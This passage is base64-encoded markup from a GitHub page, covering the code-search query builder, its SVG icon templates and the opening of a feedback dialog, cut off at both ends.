U1M2Y4IiBkYXRhLXRhcmdldD0icXVlcnktYnVpbGRlci5pbnB1dCIgZGF0YS1hY3Rpb249IgogICAgICAgICAgaW5wdXQ6cXVlcnktYnVpbGRlciNpbnB1dENoYW5nZQogICAgICAgICAgYmx1cjpxdWVyeS1idWlsZGVyI2lucHV0Qmx1cgogICAgICAgICAga2V5ZG93bjpxdWVyeS1idWlsZGVyI2lucHV0S2V5ZG93bgogICAgICAgICAgZm9jdXM6cXVlcnktYnVpbGRlciNpbnB1dEZvY3VzCiAgICAgICAgIiBkYXRhLXZpZXctY29tcG9uZW50PSJ0cnVlIiBjbGFzcz0iRm9ybUNvbnRyb2wtaW5wdXQgUXVlcnlCdWlsZGVyLUlucHV0IEZvcm1Db250cm9sLW1lZGl1bSIgLz4KICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgICAgICAgPHNwYW4gY2xhc3M9InNyLW9ubHkiIGlkPSJxdWVyeS1idWlsZGVyLXRlc3QtY2xlYXIiPkNsZWFyPC9zcGFuPgogICAgICAgICAgCiAgPGJ1dHRvbiByb2xlPSJidXR0b24iIGlkPSJxdWVyeS1idWlsZGVyLXRlc3QtY2xlYXItYnV0dG9uIiBhcmlhLWxhYmVsbGVkYnk9InF1ZXJ5LWJ1aWxkZXItdGVzdC1jbGVhciBxdWVyeS1idWlsZGVyLXRlc3QtbGFiZWwiIGRhdGEtdGFyZ2V0PSJxdWVyeS1idWlsZGVyLmNsZWFyQnV0dG9uIiBkYXRhLWFjdGlvbj0iCiAgICAgICAgICAgICAgICBjbGljazpxdWVyeS1idWlsZGVyI2NsZWFyCiAgICAgICAgICAgICAgICBmb2N1czpxdWVyeS1idWlsZGVyI2NsZWFyQnV0dG9uRm9jdXMKICAgICAgICAgICAgICAgIGJsdXI6cXVlcnktYnVpbGRlciNjbGVhckJ1dHRvbkJsdXIKICAgICAgICAgICAgICAiIHZhcmlhbnQ9InNtYWxsIiBoaWRkZW49ImhpZGRlbiIgdHlwZT0iYnV0dG9uIiBkYXRhLXZpZXctY29tcG9uZW50PSJ0cnVlIiBjbGFzcz0iQnV0dG9uIEJ1dHRvbi0taWNvbk9ubHkgQnV0dG9uLS1pbnZpc2libGUgQnV0dG9uLS1tZWRpdW0gbXItMSBweC0yIHB5LTAgZC1mbGV4IGZsZXgtaXRlbXMtY2VudGVyIHJvdW5kZWQtMSBjb2xvci1mZy1tdXRlZCI+ICAgIDxzdmcgYXJpYS1oaWRkZW49InRydWUiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiIgdmVyc2lvbj0iMS4xIiB3aWR0aD0iMTYiIGRhdGEtdmlldy1jb21wb25lbnQ9InRydWUiIGNsYXNzPSJvY3RpY29uIG9jdGljb24teC1jaXJjbGUtZmlsbCBCdXR0b24tdmlzdWFsIj4KICAgIDxwYXRoIGQ9Ik0yLjM0MyAxMy42NTdBOCA4IDAgMSAxIDEzLjY1OCAyLjM0MyA4IDggMCAwIDEgMi4zNDMgMTMuNjU3Wk02LjAzIDQuOTdhLjc1MS43NTEgMCAwIDAtMS4wNDIuMDE4Ljc1MS43NTEgMCAwIDAtLjAxOCAxLjA0Mkw2Ljk0IDggNC45NyA5Ljk3YS43NDkuNzQ5IDAgMCAwIC4zMjYgMS4yNzUuNzQ5Ljc0OSAwIDAgMCAuNzM0LS4yMTVMOCA5LjA2bDEuOTcgMS45N2EuNzQ5Ljc0OSAwIDAgMCAxLjI3NS0uMzI2Ljc0OS43NDkgMCAwIDAtLjIxNS0uNzM0TDkuMDYgOGwxLjk3LTEuOTdhLjc0OS43NDkgMCAwIDAtLjMyNi0xLjI3NS43NDkuNzQ5IDAgMCAwLS43MzQuMjE1TDggNi45NFoiPjwvcGF0aD4KPC9zdmc+CjwvYnV0dG9uPiAgCgogICAgICA8L2Rpdj4KICAgICAgPHRlbXBsYXRlIGlkPSJzZWFyY2gtaWNvbiI+CiAgPHN2ZyBhcmlhLWhpZGRlbj0idHJ1ZSIgaGVpZ2h0PSIxNiIgdmlld0JveD0iMCAwIDE2IDE2IiB2ZXJzaW9uPSIxLjEiIHdpZHRoPSIxNiIgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9Im9jdGljb24gb2N0aWNvbi1zZWFyY2giPgogICAgPHBhdGggZD0iTTEwLjY4IDExLjc0YTYgNiAwIDAgMS03LjkyMi04Ljk4MiA2IDYgMCAwIDEgOC45ODIgNy45MjJsMy4wNCAzLjA0YS43NDkuNzQ5IDAgMCAxLS4zMjYgMS4yNzUuNzQ5Ljc0OSAwIDAgMS0uNzM0LS4yMTVaTTExLjUgN2E0LjQ5OSA0LjQ5OSAwIDEgMC04Ljk5NyAwQTQuNDk5IDQuNDk5IDAgMCAwIDExLjUgN1oiPjwvcGF0aD4KPC9zdmc+CjwvdGVtcGxhdGU+Cgo8dGVtcGxhdGUgaWQ9ImNvZGUtaWNvbiI+CiAgPHN2ZyBhcmlhLWhpZGRlbj0idHJ1ZSIgaGVpZ2h0PSIxNiIgdmlld0JveD0iMCAwIDE2IDE2IiB2ZXJzaW9uPSIxLjEiIHdpZHRoPSIxNiIgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9Im9jdGljb24gb2N0aWNvbi1jb2RlIj4KICAgIDxwYXRoIGQ9Im0xMS4yOCAzLjIyIDQuMjUgNC4yNWEuNzUuNzUgMCAwIDEgMCAxLjA2bC00LjI1IDQuMjVhLjc0OS43NDkgMCAwIDEtMS4yNzUtLjMyNi43NDkuNzQ5IDAgMCAxIC4yMTUtLjczNEwxMy45NCA4bC0zLjcyLTMuNzJhLjc0OS43NDkgMCAwIDEgLjMyNi0xLjI3NS43NDkuNzQ5IDAgMCAxIC43MzQuMjE1Wm0tNi41NiAwYS43NTEuNzUxIDAgMCAxIDEuMDQyLjAxOC43NTEuNzUxIDAgMCAxIC4wMTggMS4wNDJMMi4wNiA4bDMuNzIgMy43MmEuNzQ5Ljc0OSAwIDAgMS0uMzI2IDEuMjc1Ljc0OS43NDkgMCAwIDEtLjczNC0uMjE1TC40NyA4LjUzYS43NS43NSAwIDAgMSAwLTEuMDZaIj48L3BhdGg+Cjwvc3ZnPgo8L3RlbXBsYXRlPgoKPHRlbXBsYXRlIGlkPSJmaWxlLWNvZGUtaWNvbiI+CiAgPHN2ZyBhcmlhLWhpZGRlbj0idHJ1ZSIgaGVpZ2h0PSIxNiIgdmlld0JveD0iMCAwIDE2IDE2IiB2ZXJzaW9uPSIxLjEiIHdpZHRoPSIxNiIgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9Im9jdGljb24gb2N0aWNvbi1maWxlLWNvZGUiPgogICAgPHBhdGggZD0iTTQgMS43NUM0IC43ODQgNC43ODQgMCA1Ljc1IDBoNS41ODZjLjQ2NCAwIC45MDkuMTg0IDEuMjM3LjUxM2wyLjkxNCAyLjkxNGMuMzI5LjMyOC41MTMuNzczLjUxMyAxLjIzN3Y4LjU4NkExLjc1IDEuNzUgMCAwIDEgMTQuMjUgMTVoLTlhLjc1Ljc1IDAgMCAxIDAtMS41aDlhLjI1LjI1IDAgMCAwIC4yNS0uMjVWNmgtMi43NUExLjc1IDEuNzUgMCAwIDEgMTAgNC4yNVYxLjVINS43NWEuMjUuMjUgMCAwIDAtLjI1LjI1djIuNWEuNzUuNzUgMCAwIDEtMS41IDBabTEuNzIgNC45N2EuNzUuNzUgMCAwIDEgMS4wNiAwbDIgMmEuNzUuNzUgMCAwIDEgMCAxLjA2bC0yIDJhLjc0OS43NDkgMCAwIDEtMS4yNzUtLjMyNi43NDkuNzQ5IDAgMCAxIC4yMTUtLjczNGwxLjQ3LTEuNDctMS40Ny0xLjQ3YS43NS43NSAwIDAgMSAwLTEuMDZaTTMuMjggNy43OCAxLjgxIDkuMjVsMS40NyAxLjQ3YS43NTEuNzUxIDAgMCAxLS4wMTggMS4wNDIuNzUxLjc1MSAwIDAgMS0xLjA0Mi4wMThsLTItMmEuNzUuNzUgMCAwIDEgMC0xLjA2bDItMmEuNzUxLjc1MSAwIDAgMSAxLjA0Mi4wMTguNzUxLjc1MSAwIDAgMSAuMDE4IDEuMDQyWm04LjIyLTYuMjE4VjQuMjVjMCAuMTM4LjExMi4yNS4yNS4yNWgyLjY4OGwtLjAxMS0uMDEzLTIuOTE0LTIuOTE0LS4wMTMtLjAxMVoiPjwvcGF0aD4KPC9zdmc+CjwvdGVtcGxhdGU+Cgo8dGVtcGxhdGUgaWQ9Imhpc3RvcnktaWNvbiI+CiAgPHN2ZyBhcmlhLWhpZGRlbj0idHJ1ZSIgaGVpZ2h0PSIxNiIgdmlld0JveD0iMCAwIDE2IDE2IiB2ZXJzaW9uPSIxLjEiIHdpZHRoPSIxNiIgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9Im9jdGljb24gb2N0aWNvbi1oaXN0b3J5Ij4KICAgIDxwYXRoIGQ9Im0uNDI3IDEuOTI3IDEuMjE1IDEuMjE1YTguMDAyIDguMDAyIDAgMSAxLTEuNiA1LjY4NS43NS43NSAwIDEgMSAxLjQ5My0uMTU0IDYuNSA2LjUgMCAxIDAgMS4xOC00LjQ1OGwxLjM1OCAxLjM1OEEuMjUuMjUgMCAwIDEgMy44OTYgNkguMjVBLjI1LjI1IDAgMCAxIDAgNS43NVYyLjEwNGEuMjUuMjUgMCAwIDEgLjQyNy0uMTc3Wk03Ljc1IDRhLjc1Ljc1IDAgMCAxIC43NS43NXYyLjk5MmwyLjAyOC44MTJhLjc1Ljc1IDAgMCAxLS41NTcgMS4zOTJsLTIuNS0xQS43NTEuNzUxIDAgMCAxIDcgOC4yNXYtMy41QS43NS43NSAwIDAgMSA3Ljc1IDRaIj48L3BhdGg+Cjwvc3ZnPgo8L3RlbXBsYXRlPgoKPHRlbXBsYXRlIGlkPSJyZXBvLWljb24iPgogIDxzdmcgYXJpYS1oaWRkZW49InRydWUiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiIgdmVyc2lvbj0iMS4xIiB3aWR0aD0iMTYiIGRhdGEtdmlldy1jb21wb25lbnQ9InRydWUiIGNsYXNzPSJvY3RpY29uIG9jdGljb24tcmVwbyI+CiAgICA8cGF0aCBkPSJNMiAyLjVBMi41IDIuNSAwIDAgMSA0LjUgMGg4Ljc1YS43NS43NSAwIDAgMSAuNzUuNzV2MTIuNWEuNzUuNzUgMCAwIDEtLjc1Ljc1aC0yLjVhLjc1Ljc1IDAgMCAxIDAtMS41aDEuNzV2LTJoLThhMSAxIDAgMCAwLS43MTQgMS43Ljc1Ljc1IDAgMSAxLTEuMDcyIDEuMDVBMi40OTUgMi40OTUgMCAwIDEgMiAxMS41Wm0xMC41LTFoLThhMSAxIDAgMCAwLTEgMXY2LjcwOEEyLjQ4NiAyLjQ4NiAwIDAgMSA0LjUgOWg4Wk01IDEyLjI1YS4yNS4yNSAwIDAgMSAuMjUtLjI1aDMuNWEuMjUuMjUgMCAwIDEgLjI1LjI1djMuMjVhLjI1LjI1IDAgMCAxLS40LjJsLTEuNDUtMS4wODdhLjI0OS4yNDkgMCAwIDAtLjMgMEw1LjQgMTUuN2EuMjUuMjUgMCAwIDEtLjQtLjJaIj48L3BhdGg+Cjwvc3ZnPgo8L3RlbXBsYXRlPgoKPHRlbXBsYXRlIGlkPSJib29rbWFyay1pY29uIj4KICA8c3ZnIGFyaWEtaGlkZGVuPSJ0cnVlIiBoZWlnaHQ9IjE2IiB2aWV3Qm94PSIwIDAgMTYgMTYiIHZlcnNpb249IjEuMSIgd2lkdGg9IjE2IiBkYXRhLXZpZXctY29tcG9uZW50PSJ0cnVlIiBjbGFzcz0ib2N0aWNvbiBvY3RpY29uLWJvb2ttYXJrIj4KICAgIDxwYXRoIGQ9Ik0zIDIuNzVDMyAxLjc4NCAzLjc4NCAxIDQuNzUgMWg2LjVjLjk2NiAwIDEuNzUuNzg0IDEuNzUgMS43NXYxMS41YS43NS43NSAwIDAgMS0xLjIyNy41NzlMOCAxMS43MjJsLTMuNzczIDMuMTA3QS43NTEuNzUxIDAgMCAxIDMgMTQuMjVabTEuNzUtLjI1YS4yNS4yNSAwIDAgMC0uMjUuMjV2OS45MWwzLjAyMy0yLjQ4OWEuNzUuNzUgMCAwIDEgLjk1NCAwbDMuMDIzIDIuNDlWMi43NWEuMjUuMjUgMCAwIDAtLjI1LS4yNVoiPjwvcGF0aD4KPC9zdmc+CjwvdGVtcGxhdGU+Cgo8dGVtcGxhdGUgaWQ9InBsdXMtY2lyY2xlLWljb24iPgogIDxzdmcgYXJpYS1oaWRkZW49InRydWUiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiIgdmVyc2lvbj0iMS4xIiB3aWR0aD0iMTYiIGRhdGEtdmlldy1jb21wb25lbnQ9InRydWUiIGNsYXNzPSJvY3RpY29uIG9jdGljb24tcGx1cy1jaXJjbGUiPgogICAgPHBhdGggZD0iTTggMGE4IDggMCAxIDEgMCAxNkE4IDggMCAwIDEgOCAwWk0xLjUgOGE2LjUgNi41IDAgMSAwIDEzIDAgNi41IDYuNSAwIDAgMC0xMyAwWm03LjI1LTMuMjV2Mi41aDIuNWEuNzUuNzUgMCAwIDEgMCAxLjVoLTIuNXYyLjVhLjc1Ljc1IDAgMCAxLTEuNSAwdi0yLjVoLTIuNWEuNzUuNzUgMCAwIDEgMC0xLjVoMi41di0yLjVhLjc1Ljc1IDAgMCAxIDEuNSAwWiI+PC9wYXRoPgo8L3N2Zz4KPC90ZW1wbGF0ZT4KCjx0ZW1wbGF0ZSBpZD0iY2lyY2xlLWljb24iPgogIDxzdmcgYXJpYS1oaWRkZW49InRydWUiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiIgdmVyc2lvbj0iMS4xIiB3aWR0aD0iMTYiIGRhdGEtdmlldy1jb21wb25lbnQ9InRydWUiIGNsYXNzPSJvY3RpY29uIG9jdGljb24tZG90LWZpbGwiPgogICAgPHBhdGggZD0iTTggNGE0IDQgMCAxIDEgMCA4IDQgNCAwIDAgMSAwLThaIj48L3BhdGg+Cjwvc3ZnPgo8L3RlbXBsYXRlPgoKPHRlbXBsYXRlIGlkPSJ0cmFzaC1pY29uIj4KICA8c3ZnIGFyaWEtaGlkZGVuPSJ0cnVlIiBoZWlnaHQ9IjE2IiB2aWV3Qm94PSIwIDAgMTYgMTYiIHZlcnNpb249IjEuMSIgd2lkdGg9IjE2IiBkYXRhLXZpZXctY29tcG9uZW50PSJ0cnVlIiBjbGFzcz0ib2N0aWNvbiBvY3RpY29uLXRyYXNoIj4KICAgIDxwYXRoIGQ9Ik0xMSAxLjc1VjNoMi4yNWEuNzUuNzUgMCAwIDEgMCAxLjVIMi43NWEuNzUuNzUgMCAwIDEgMC0xLjVINVYxLjc1QzUgLjc4NCA1Ljc4NCAwIDYuNzUgMGgyLjVDMTAuMjE2IDAgMTEgLjc4NCAxMSAxLjc1Wk00LjQ5NiA2LjY3NWwuNjYgNi42YS4yNS4yNSAwIDAgMCAuMjQ5LjIyNWg1LjE5YS4yNS4yNSAwIDAgMCAuMjQ5LS4yMjVsLjY2LTYuNmEuNzUuNzUgMCAwIDEgMS40OTIuMTQ5bC0uNjYgNi42QTEuNzQ4IDEuNzQ4IDAgMCAxIDEwLjU5NSAxNWgtNS4xOWExLjc1IDEuNzUgMCAwIDEtMS43NDEtMS41NzVsLS42Ni02LjZhLjc1Ljc1IDAgMSAxIDEuNDkyLS4xNVpNNi41IDEuNzVWM2gzVjEuNzVhLjI1LjI1IDAgMCAwLS4yNS0uMjVoLTIuNWEuMjUuMjUgMCAwIDAtLjI1LjI1WiI+PC9wYXRoPgo8L3N2Zz4KPC90ZW1wbGF0ZT4KCjx0ZW1wbGF0ZSBpZD0idGVhbS1pY29uIj4KICA8c3ZnIGFyaWEtaGlkZGVuPSJ0cnVlIiBoZWlnaHQ9IjE2IiB2aWV3Qm94PSIwIDAgMTYgMTYiIHZlcnNpb249IjEuMSIgd2lkdGg9IjE2IiBkYXRhLXZpZXctY29tcG9uZW50PSJ0cnVlIiBjbGFzcz0ib2N0aWNvbiBvY3RpY29uLXBlb3BsZSI+CiAgICA8cGF0aCBkPSJNMiA1LjVhMy41IDMuNSAwIDEgMSA1Ljg5OCAyLjU0OSA1LjUwOCA1LjUwOCAwIDAgMSAzLjAzNCA0LjA4NC43NS43NSAwIDEgMS0xLjQ4Mi4yMzUgNCA0IDAgMCAwLTcuOSAwIC43NS43NSAwIDAgMS0xLjQ4Mi0uMjM2QTUuNTA3IDUuNTA3IDAgMCAxIDMuMTAyIDguMDUgMy40OTMgMy40OTMgMCAwIDEgMiA1LjVaTTExIDRhMy4wMDEgMy4wMDEgMCAwIDEgMi4yMiA1LjAxOCA1LjAxIDUuMDEgMCAwIDEgMi41NiAzLjAxMi43NDkuNzQ5IDAgMCAxLS44ODUuOTU0Ljc1Mi43NTIgMCAwIDEtLjU0OS0uNTE0IDMuNTA3IDMuNTA3IDAgMCAwLTIuNTIyLTIuMzcyLjc1Ljc1IDAgMCAxLS41NzQtLjczdi0uMzUyYS43NS43NSAwIDAgMSAuNDE2LS42NzJBMS41IDEuNSAwIDAgMCAxMSA1LjUuNzUuNzUgMCAwIDEgMTEgNFptLTUuNS0uNWEyIDIgMCAxIDAtLjAwMSAzLjk5OUEyIDIgMCAwIDAgNS41IDMuNVoiPjwvcGF0aD4KPC9zdmc+CjwvdGVtcGxhdGU+Cgo8dGVtcGxhdGUgaWQ9InByb2plY3QtaWNvbiI+CiAgPHN2ZyBhcmlhLWhpZGRlbj0idHJ1ZSIgaGVpZ2h0PSIxNiIgdmlld0JveD0iMCAwIDE2IDE2IiB2ZXJzaW9uPSIxLjEiIHdpZHRoPSIxNiIgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9Im9jdGljb24gb2N0aWNvbi1wcm9qZWN0Ij4KICAgIDxwYXRoIGQ9Ik0xLjc1IDBoMTIuNUMxNS4yMTYgMCAxNiAuNzg0IDE2IDEuNzV2MTIuNUExLjc1IDEuNzUgMCAwIDEgMTQuMjUgMTZIMS43NUExLjc1IDEuNzUgMCAwIDEgMCAxNC4yNVYxLjc1QzAgLjc4NC43ODQgMCAxLjc1IDBaTTEuNSAxLjc1djEyLjVjMCAuMTM4LjExMi4yNS4yNS4yNWgxMi41YS4yNS4yNSAwIDAgMCAuMjUtLjI1VjEuNzVhLjI1LjI1IDAgMCAwLS4yNS0uMjVIMS43NWEuMjUuMjUgMCAwIDAtLjI1LjI1Wk0xMS43NSAzYS43NS43NSAwIDAgMSAuNzUuNzV2Ny41YS43NS43NSAwIDAgMS0xLjUgMHYtNy41YS43NS43NSAwIDAgMSAuNzUtLjc1Wm0tOC4yNS43NWEuNzUuNzUgMCAwIDEgMS41IDB2NS41YS43NS43NSAwIDAgMS0xLjUgMFpNOCAzYS43NS43NSAwIDAgMSAuNzUuNzV2My41YS43NS43NSAwIDAgMS0xLjUgMHYtMy41QS43NS43NSAwIDAgMSA4IDNaIj48L3BhdGg+Cjwvc3ZnPgo8L3RlbXBsYXRlPgoKPHRlbXBsYXRlIGlkPSJwZW5jaWwtaWNvbiI+CiAgPHN2ZyBhcmlhLWhpZGRlbj0idHJ1ZSIgaGVpZ2h0PSIxNiIgdmlld0JveD0iMCAwIDE2IDE2IiB2ZXJzaW9uPSIxLjEiIHdpZHRoPSIxNiIgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9Im9jdGljb24gb2N0aWNvbi1wZW5jaWwiPgogICAgPHBhdGggZD0iTTExLjAxMyAxLjQyN2ExLjc1IDEuNzUgMCAwIDEgMi40NzQgMGwxLjA4NiAxLjA4NmExLjc1IDEuNzUgMCAwIDEgMCAyLjQ3NGwtOC42MSA4LjYxYy0uMjEuMjEtLjQ3LjM2NC0uNzU2LjQ0NWwtMy4yNTEuOTNhLjc1Ljc1IDAgMCAxLS45MjctLjkyOGwuOTI5LTMuMjVjLjA4MS0uMjg2LjIzNS0uNTQ3LjQ0NS0uNzU4bDguNjEtOC42MVptLjE3NiA0LjgyM0w5Ljc1IDQuODFsLTYuMjg2IDYuMjg3YS4yNTMuMjUzIDAgMCAwLS4wNjQuMTA4bC0uNTU4IDEuOTUzIDEuOTUzLS41NThhLjI1My4yNTMgMCAwIDAgLjEwOC0uMDY0Wm0xLjIzOC0zLjc2M2EuMjUuMjUgMCAwIDAtLjM1NCAwTDEwLjgxMSAzLjc1bDEuNDM5IDEuNDQgMS4yNjMtMS4yNjNhLjI1LjI1IDAgMCAwIDAtLjM1NFoiPjwvcGF0aD4KPC9zdmc+CjwvdGVtcGxhdGU+CgogICAgICAgIDxkaXYgY2xhc3M9InBvc2l0aW9uLXJlbGF0aXZlIj4KICAgICAgICAgICAgICAgIDx1bAogICAgICAgICAgICAgICAgICByb2xlPSJsaXN0Ym94IgogICAgICAgICAgICAgICAgICBjbGFzcz0iQWN0aW9uTGlzdFdyYXAgUXVlcnlCdWlsZGVyLUxpc3RXcmFwIgogICAgICAgICAgICAgICAgICBhcmlhLWxhYmVsPSJTdWdnZXN0aW9ucyIKICAgICAgICAgICAgICAgICAgZGF0YS1hY3Rpb249IgogICAgICAgICAgICAgICAgICAgIGNvbWJvYm94LWNvbW1pdDpxdWVyeS1idWlsZGVyI2NvbWJvYm94Q29tbWl0CiAgICAgICAgICAgICAgICAgICAgbW91c2Vkb3duOnF1ZXJ5LWJ1aWxkZXIjcmVzdWx0c01vdXNlZG93bgogICAgICAgICAgICAgICAgICAiCiAgICAgICAgICAgICAgICAgIGRhdGEtdGFyZ2V0PSJxdWVyeS1idWlsZGVyLnJlc3VsdHNMaXN0IgogICAgICAgICAgICAgICAgICBkYXRhLXBlcnNpc3QtbGlzdD1mYWxzZQogICAgICAgICAgICAgICAgICBpZD0icXVlcnktYnVpbGRlci10ZXN0LXJlc3VsdHMiCiAgICAgICAgICAgICAgICA+PC91bD4KICAgICAgICA8L2Rpdj4KICAgICAgPGRpdiBjbGFzcz0iRm9ybUNvbnRyb2wtaW5saW5lVmFsaWRhdGlvbiIgaWQ9InZhbGlkYXRpb24tNzU0MGQwMzItZDUwMi00NzgyLTg5ZTctZDc4ZWI4ZmU1M2Y4IiBoaWRkZW49ImhpZGRlbiI+CiAgICAgICAgPHNwYW4gY2xhc3M9IkZvcm1Db250cm9sLWlubGluZVZhbGlkYXRpb24tLXZpc3VhbCI+CiAgICAgICAgICA8c3ZnIGFyaWEtaGlkZGVuPSJ0cnVlIiBoZWlnaHQ9IjEyIiB2aWV3Qm94PSIwIDAgMTIgMTIiIHZlcnNpb249IjEuMSIgd2lkdGg9IjEyIiBkYXRhLXZpZXctY29tcG9uZW50PSJ0cnVlIiBjbGFzcz0ib2N0aWNvbiBvY3RpY29uLWFsZXJ0LWZpbGwiPgogICAgPHBhdGggZD0iTTQuODU1LjcwOGMuNS0uODk2IDEuNzktLjg5NiAyLjI5IDBsNC42NzUgOC4zNTFhMS4zMTIgMS4zMTIgMCAwIDEtMS4xNDYgMS45NTRIMS4zM0ExLjMxMyAxLjMxMyAwIDAgMSAuMTgzIDkuMDU4Wk03IDdWM0g1djRabS0xIDNhMSAxIDAgMSAwIDAtMiAxIDEgMCAwIDAgMCAyWiI+PC9wYXRoPgo8L3N2Zz4KICAgICAgICA8L3NwYW4+CiAgICAgICAgPHNwYW4+PC9zcGFuPgo8L2Rpdj4gICAgPC9kaXY+CiAgICA8ZGl2IGRhdGEtdGFyZ2V0PSJxdWVyeS1idWlsZGVyLnNjcmVlblJlYWRlckZlZWRiYWNrIiBhcmlhLWxpdmU9InBvbGl0ZSIgYXJpYS1hdG9taWM9InRydWUiIGNsYXNzPSJzci1vbmx5Ij48L2Rpdj4KPC9xdWVyeS1idWlsZGVyPjwvZm9ybT4KICAgICAgICAgIDxkaXYgY2xhc3M9ImQtZmxleCBmbGV4LXJvdyBjb2xvci1mZy1tdXRlZCBweC0zIHRleHQtc21hbGwgY29sb3ItYmctZGVmYXVsdCBzZWFyY2gtZmVlZGJhY2stcHJvbXB0Ij4KICAgICAgICAgICAgPGEgdGFyZ2V0PSJfYmxhbmsiIGhyZWY9Imh0dHBzOi8vZG9jcy5naXRodWIuY29tL2VuL3NlYXJjaC1naXRodWIvZ2l0aHViLWNvZGUtc2VhcmNoL3VuZGVyc3RhbmRpbmctZ2l0aHViLWNvZGUtc2VhcmNoLXN5bnRheCIgZGF0YS12aWV3LWNvbXBvbmVudD0idHJ1ZSIgY2xhc3M9IkxpbmsgY29sb3ItZmctYWNjZW50IHRleHQtbm9ybWFsIG1sLTIiPgogICAgICAgICAgICAgIFNlYXJjaCBzeW50YXggdGlwcwo8L2E+ICAgICAgICAgICAgPGRpdiBjbGFzcz0iZC1mbGV4IGZsZXgtMSI+PC9kaXY+CiAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KPC9kaXY+CgogICAgPC9kaXY+CjwvbW9kYWwtZGlhbG9nPjwvZGl2PgogIDwvZGl2PgogIDxkaXYgZGF0YS1hY3Rpb249ImNsaWNrOnFic2VhcmNoLWlucHV0I3JldHJhY3QiIGNsYXNzPSJkYXJrLWJhY2tkcm9wIHBvc2l0aW9uLWZpeGVkIiBoaWRkZW4gZGF0YS10YXJnZXQ9InFic2VhcmNoLWlucHV0LmRhcmtCYWNrZHJvcCI+PC9kaXY+CiAgPGRpdiBjbGFzcz0iY29sb3ItZmctZGVmYXVsdCI+CiAgICAKPGRpdiBjbGFzcz0iT3ZlcmxheS0taGlkZGVuIE92ZXJsYXktYmFja2Ryb3AtLWNlbnRlciIgZGF0YS1tb2RhbC1kaWFsb2ctb3ZlcmxheT4KICA8bW9kYWwtZGlhbG9nIGRhdGEtdGFyZ2V0PSJxYnNlYXJjaC1pbnB1dC5mZWVkYmFja0RpYWxvZyIgZGF0YS1hY3Rpb249ImNsb3NlOnFic2VhcmNoLWlucHV0I2hhbmRsZURpYWxvZ0Nsb3NlIGNhbmNlbDpxYnNlYXJjaC1pbnB1dCNoYW5kbGVEaWFsb2dDbG9zZSIgcm9sZT0iZGlhbG9nIiBpZD0iZmVlZGJhY2stZGlhbG9nIiBhcmlhLW1vZGFsPSJ0cnVlIiBhcmlhLWRpc2FibGVkPSJ0cnVlIiBhcmlhLWxhYmVsbGVkYnk9ImZlZWRiYWNrLWRpYWxvZy10aXRsZSIgYXJpYS1kZXNjcmliZWRieT0iZmVlZGJhY2stZGlhbG9nLWRlc2NyaXB0aW9uIiBkYXRhLXZpZXctY29tcG9uZW50PSJ0cnVlIiBjbGFzcz0iT3ZlcmxheSBPdmVybGF5LXdoZW5OYXJyb3cgT3ZlcmxheS0tc2l6ZS1tZWRpdW0gT3ZlcmxheS0tbW90aW9uLXNjYWxlRmFkZSI+CiAgICA8ZGl2IGRhdGEtdmlldy1jb21wb25lbnQ9InRydWUiIGNsYXNzPSJPdmVybGF5LWhlYWRlciI+CiAgPGRpdiBjbGFzcz0iT3ZlcmxheS1oZWFkZXJDb250ZW50V3JhcCI+CiAgICA8ZGl2IGNsYXNzPSJPdmVybGF5LXRpdGxlV3JhcCI+CiAgICAgIDxoMSBjbGFzcz0iT3ZlcmxheS10aXRsZSAiIGlkPSJmZWVkYmFjay1kaWFsb2ctdGl0bGUiPgogICAgICAgIFByb3ZpZGUgZmVlZGJhY2sKICAgICAgPC9oMT4KICAgIDwvZGl2PgogICAgPGRpdiBjbGFzcz0iT3ZlcmxheS1hY3Rpb25XcmFwIj4KICAgICAgPGJ1dHRvbiBkYXRhLWNsb3NlLWRpYWxvZy1pZD0iZmVlZGJhY2stZGlhbG9nIiBhcmlhLWxhYmVsPSJDbG9zZSIgdHlwZT0iYnV0dG9uIiBkYXRhLXZpZXctY29tcG9uZW50PSJ0cnVlIiBjbGFzcz0iY2xvc2UtYnV0dG9uIE92ZXJsYXktY2xvc2VCdXR0b24iPjxzdmcgYXJpYS1oaWRkZW49InRydWUiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiIgdmVyc2lvbj0iMS4xIiB3aWR0aD0iMTYiIGRhdGEtdmlldy1jb21wb25lbnQ9InRydWUiIGNsYXNzPSJvY3RpY29uIG9jdGljb24teCI+CiAgICA8cGF0aCBkPSJNMy43MiAzLjcyYS43NS43NSAwIDAgMSAxLjA2IDBMOCA2Ljk0bDMuMjItMy4yMmEuNzQ5Ljc0OSAwIDAgMSAxLjI3NS4zMjYuNzQ5Ljc0OSAwIDAgMS0uMjE1LjczNEw5LjA2IDhsMy4yMiAzLjIyYS43NDkuNzQ5IDAgMCAxLS4zMjYgMS4yNzUuNzQ5Ljc0OSAwIDAgMS0uNzM0LS4yMTVMOCA5LjA2bC0zLjIyIDMuMjJhLjc1MS43NTEgMCAwIDEtMS4wNDItLjAxOC43NTEuNzUxIDAgMCAxLS4wMTgtMS4wNDJMNi45NCA4IDMuNzIgNC43OGEuNzUuNzUgMCAwIDEgMC0xLjA2WiI+PC9wYXRoPgo8L3N2Zz48L2J1dHRvbj4KICAgIDwvZGl2PgogIDwvZGl2Pgo8L2Rpdj4KICAgICAgPGRpdiBkYXRhLXZpZXctY29tcG9uZW50PSJ0cnVlIiBjbGFzcz0iT3ZlcmxheS1ib2R5Ij4gICAgICAgIDwhLS0gJyJgIC0tPjwhLS0gPC90ZXh0YXJlYT48L3htcD4gLS0+PC9vcHRpb24+PC9mb3JtPjxmb3JtIGlkPSJjb2RlLXNlYXJjaC1mZWVkYmFjay1mb3JtIiBkYXRhLXR1cmJvPSJmYWxzZSIgYWN0aW9uPSIvc2VhcmNoL2ZlZWRiYWNrIiBhY2Nlc